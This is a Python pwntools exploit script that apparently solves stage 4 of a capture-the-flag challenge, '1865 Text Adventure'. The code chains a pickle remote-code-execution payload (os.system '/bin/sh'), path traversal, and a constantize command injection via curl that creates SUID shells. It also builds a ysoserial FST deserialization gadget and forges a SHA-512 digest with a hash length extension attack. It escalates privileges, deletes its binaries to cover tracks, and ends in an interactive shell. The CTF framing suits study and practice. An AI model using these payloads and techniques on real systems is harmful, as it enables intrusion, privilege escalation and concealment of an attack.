#!/usr/bin/env python

'''
1865 Text Adventure
Solution for Stage 4

There are two vulnerabilities used in this stage:

1. A hash length extension attack to extend protobuf data with an arbitrary field and forge the
    hash digest.
2. A FST deserialization vulnerability to trigger arbitrary code execution.

The cake export functionality is implemented with the following code. Note that the raw protobuf
wire data is encased in Base64 then appended to a secret key before hashing. Base64 can tolerate
invalid characters so the hash length extension attack can work.

    byte[] cake_data = cakep.build().toByteArray();
    byte[] cake_b64 = Base64.encodeBase64(cake_data);

    try {
        MessageDigest md = MessageDigest.getInstance("SHA-512");
        byte[] combined = new byte[secret.length + cake_b64.length];
        System.arraycopy(secret, 0, combined, 0, secret.length);
        System.arraycopy(cake_b64, 0, combined, secret.length, cake_b64.length);
        byte[] message_digest = md.digest(combined);
        HashMap<String, String> hash_map = new HashMap<String, String>();
        hash_map.put("digest", Hex.encodeHexString(message_digest));
        hash_map.put("cake", Hex.encodeHexString(cake_b64));
        String output = (new Gson()).toJson(hash_map);
        System.out.println("Here's your cake to go:");
        System.out.println(output);
    } catch (NoSuchAlgorithmException e) {
        System.out.println("What how can this be?!?");
    }

The corresponding import functionality is just the following performed in inverse with a check.

    String saved = scanner.nextLine().trim();

    try {

        HashMap<String, String> hash_map = new HashMap<String, String>();
        hash_map = (new Gson()).fromJson(saved, hash_map.getClass());
        byte[] challenge_digest = Hex.decodeHex(hash_map.get("digest"));
        byte[] challenge_cake_b64 = Hex.decodeHex(hash_map.get("cake"));
        byte[] challenge_cake_data = Base64.decodeBase64(challenge_cake_b64);

        MessageDigest md = MessageDigest.getInstance("SHA-512");
        byte[] combined = new byte[secret.length + challenge_cake_b64.length];
        System.arraycopy(secret, 0, combined, 0, secret.length);
        System.arraycopy(challenge_cake_b64, 0, combined, secret.length,
                challenge_cake_b64.length);
        byte[] message_digest = md.digest(combined);

        if (Arrays.equals(message_digest, challenge_digest)) {
            Cake new_cakep = Cake.parseFrom(challenge_cake_data);
            cakep.clear();
            cakep.mergeFrom(new_cakep);
            System.out.println("Cake successfully gotten!");
        }
        else {
            System.out.println("Your saved cake went really bad...");
        }

    } catch (DecoderException e) {
        System.out.println("What what what?!?");
    } catch (InvalidProtocolBufferException e) {
        System.out.println("No bueno!");
    } catch (NoSuchAlgorithmException e) {
        System.out.println("What how can this be?!?");
    }

Finally, the forged fireworks field can be triggered for deserialization with the eat menu option.

    System.out.println("You eat the cake and you feel good!");

    for (Cake.Decoration deco : cakep.getDecorationsList()) {
        if (deco == Cake.Decoration.TINY_HELLO_KITTY) {
            running = false;
            System.out.println("A tiny Hello Kitty figurine gets lodged in your " +
                    "throat. You get very angry at this and storm off.");
            break;
        }
    }

    if (cakep.getFireworksCount() == 0) {
        System.out.println("Nothing else interesting happens.");
    } else {
        for (ByteString firework_bs : cakep.getFireworksList()) {
            byte[] firework_data = firework_bs.toByteArray();
            Firework firework = (Firework) conf.asObject(firework_data);
            firework.fire();
        }
    }

The FST serialization library is source-compatible with JDK serialization but differs in the binary
format. Hence, already established deserialization gadgets work with FST.
'''

from pwn import *
from common import Common
from urllib.request import quote

import pickle
import os
import uuid
import json
import binascii
import base64
import hashpumpy
import time


class Exploit:
    '''Spawns a /bin/bash shell when deserialized.

    Includes some required strings that are checked server-side to determine 'dill-ness'.
    '''

    def __reduce__(self):
        cmd = ('/bin/sh')
        return os.system, (cmd,), {'a': 'dill._dill', 'b': 'rabbithole', 'c': 'on_get'}


def encode_varint(number: int) -> bytes:
    '''Encodes a number into a varint.
    '''
    # First the number needs to be chunked up into groups of 7 bits.
    groups = []
    current_number = number
    while current_number > 0:
        current_group = current_number & 0x7f
        current_number = current_number >> 7
        groups.append(current_group)

    # For each group, set the MSB based on the index and append them. The least significant group
    # starts first.
    result = b''
    for i, group in enumerate(groups):
        mask = 0x80
        # Do not set the MSB for the last byte.
        if i == len(groups) - 1:
            mask = 0x00
        result += bytes([mask | group])

    return result


def encode_key(field: int, wire_type: int) -> bytes:
    '''Encodes the key as a varint.

    Wire type can only take up 3 bits.
    '''
    key_number = (field << 3) | (wire_type & 0x7)
    return encode_varint(key_number)


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove']
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Teleport to the location of the golden-hookah.
    log.info('Teleporting to under-a-giant-mushroom to get the golden-hookah...')
    mushroom = ('sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-'
                'the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom')
    c.sendline('teleport ' + mushroom)
    c.get(b'golden-hookah')

    # Teleport to /opt/wonderland/logs/
    log.info('Teleporting to /opt/wonderland/logs')
    c.sendline(b'teleport ../../../../../../opt/wonderland/logs')
    c.get_until_prompt()

    # Generate the payload and write an item to the logs directory.
    log.info('Generating pickle RCE payload...')
    payload = quote(pickle.dumps(Exploit()), safe='').encode('ascii')
    random_filename = str(uuid.uuid4()).encode('ascii')
    log.info('Writing payload to {}.item'.format(random_filename.decode('ascii')))
    c.sendline(b'blowsmoke ' + random_filename + b'.item ' + payload)
    c.get_until_prompt()

    # Trigger the first RCE.
    log.info('Triggering RCE...')
    c.sendline(b'get logs-' + random_filename)
    c.get_until_prompt()
    c.get_until_prompt()

    # Create a mouse SUID shell via the pool-of-tears constantize vulnerability.
    # Construct the URL
    log.info('Constructing pool-of-tears exploit URL.')
    binbash = quote('../../../../../../../bin/bash', safe='')
    cmd_args = [
        'cp /bin/sh /tmp/hackers_use_me/pwn',
        'chmod +x /tmp/hackers_use_me/pwn',
        'chmod +s /tmp/hackers_use_me/pwn'
    ]
    cmd = quote(';'.join(cmd_args), safe='')
    exploit_url = ('http://localhost:4000/api/v1/smoke?uniqid={}&ctype=Kernel&cop=system&'
                   'cargs[]=-c&cargs[]={}&content=potato').format(binbash, cmd)
    # Send the exploit to abuse Kernel.system to create a mouse SUID binary.
    log.info('Sending curl request to trigger the creation of the SUID binary.')
    c.sendline("curl '{}'".format(exploit_url))
    c.recvuntil(b'Type is not implemented yet.')
    # Trigger the privilege escalation, /bin/sh -p.
    log.info('Triggering the SUID binary to escalate to the mouse user.')
    c.sendline(b'/tmp/hackers_use_me/pwn -p')
    # Remove the binary.
    log.info('Removing the SUID binary to clean up the tracks.')
    c.sendline(b'rm /tmp/hackers_use_me/pwn')

    # Read the invitation.
    log.info('Reading the invitation code...')
    c.sendline(b'cat /home/mouse/an-unbirthday-invitation.letter')
    c.sendline(b'echo END_OF_FLAG')
    c.recvuntil(b'By the way, please quote the following before entering the party:')
    invitation_code = c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b'').strip()
    log.success("Got invitation code: {}".format(invitation_code.decode('utf-8')))

    # Open a connection to the unbirthday party.
    c.sendline(b'nc localhost 4714')
    c.recvuntil(b'Invitation Code: ')
    c.sendline(invitation_code)
    c.recvuntil(b'Correct! Welcome!')
    log.info('Successfully entered the party.')

    # Set a name of at least the SHA512 block size.
    c.recvuntil(b'Choice: ')
    name = b'A' * (1024//8)
    c.sendline('1')
    c.sendline(name)
    c.recvuntil(b'Name set!')
    log.info('Successfully set a new name to ensure a large enough input size.')

    # Set a caption until the base64 cake output requires no padding.
    log.info('Looking for a suitable cake export...')
    cake_struct = None
    caption_length = 0
    while True:
        # Get the current exported cake.
        c.recvuntil(b'Choice: ')
        c.sendline(b'7')
        c.recvuntil(b"Here's your cake to go:\n")
        json_data = c.recvuntil(b'\n').strip()
        cake_struct = json.loads(json_data)
        cake_base64 = binascii.unhexlify(cake_struct['cake'])

        # Print some information.
        log.info("Caption Length: {}".format(caption_length))
        log.info("Cake: {}".format(cake_base64.decode('ascii')))
        log.info("Digest: {}".format(cake_struct['digest']))

        # If it meets the constraints, then break immediately.
        if cake_base64[-1] != ord(b'='):
            break

        # Otherwise, add more captions.
        c.recvuntil(b'Choice: ')
        c.sendline(b'3')
        caption_length += 1
        caption = b'B' * caption_length
        c.sendline(caption)
        c.recvuntil(b'Caption set!')

    # Generate the deserialization payload.
    log.info('Generating FST Deserialization payload to create a hatter SUID binary.')
    fst_payload = subprocess.check_output(
        ['java', '-jar', '/opt/wonderland/ysoserial-0.0.6-SNAPSHOT-all.jar',
         '-fst', 'CommonsBeanutils1',
         'bash -c {cp,/bin/sh,/tmp/hackers_use_me/pwn2};{chmod,+s,/tmp/hackers_use_me/pwn2}'],
        stderr=subprocess.DEVNULL
    )

    # Generate the protobuf serialized fireworks field
    #     repeated bytes fireworks = 5;
    # From https://developers.google.com/protocol-buffers/docs/encoding#structure:
    # The wire type of the length-delimited fields like bytes is 2.
    # After the key, the length of the bytes is encoded as a varint.
    log.info('Constructing the protobuf field from scratch.')
    fireworks_payload = encode_key(5, 2)
    fireworks_payload += encode_varint(len(fst_payload))
    fireworks_payload += fst_payload
    fireworks_encoded = base64.b64encode(fireworks_payload)

    # Forge the digest with the hash length extension attack.
    # The key length is known to be 32 from the App.java key length check.
    log.info('Forging the new cake and digest with the malicious fireworks field.')
    forged_digest, forged_data = hashpumpy.hashpump(cake_struct['digest'], cake_base64,
                                                    fireworks_encoded, 32)

    # Construct the new exported cake.
    new_cake = {
        'digest': forged_digest,
        'cake': binascii.hexlify(forged_data).decode('raw_unicode_escape')
    }
    new_cake_json = json.dumps(new_cake)
    log.success('New Cake JSON forged successfully!')

    # Send the forged JSON.
    log.info('Sending the forged JSON.')
    c.recvuntil(b'Choice: ')
    c.sendline(b'8')
    c.recvuntil(b'Please enter your saved cake: ')
    c.sendline(new_cake_json)
    c.recvuntil(b'Cake successfully gotten!')

    # Trigger the deserialization and get RCE as hatter.
    # The service should crash.
    log.info('Triggering the deserialization to create the hatter SUID binary...')
    c.recvuntil(b'Choice: ')
    c.sendline(b'9')
    c.recvuntil(b'Hope you had fun! Bad day!')
    c.sendline(b'\n\n')

    # Send a test echo to check if we are back in the shell.
    # Wait a small moment.
    log.progress('Waiting a moment to return back to the shell context...')
    time.sleep(2)
    c.sendline(b'\n\n')

    # Drop into the hatter suid shell.
    log.info('Triggering the SUID binary to escalate to the hatter user.')
    c.sendline(b'/tmp/hackers_use_me/pwn2 -p')
    # Remove the binary.
    log.info('Removing the SUID binary to clean up the tracks.')
    c.sendline(b'rm /tmp/hackers_use_me/pwn2')

    # Get the flag.
    log.info('Reading the flag at /home/hatter/flag4')
    log.success('Flag 4:')
    c.sendline('cat /home/hatter/flag4\n\n\n')
    c.sendline('echo END_OF_FLAG\n\n\n')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b'').strip())

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()


if __name__ == '__main__':
    main()
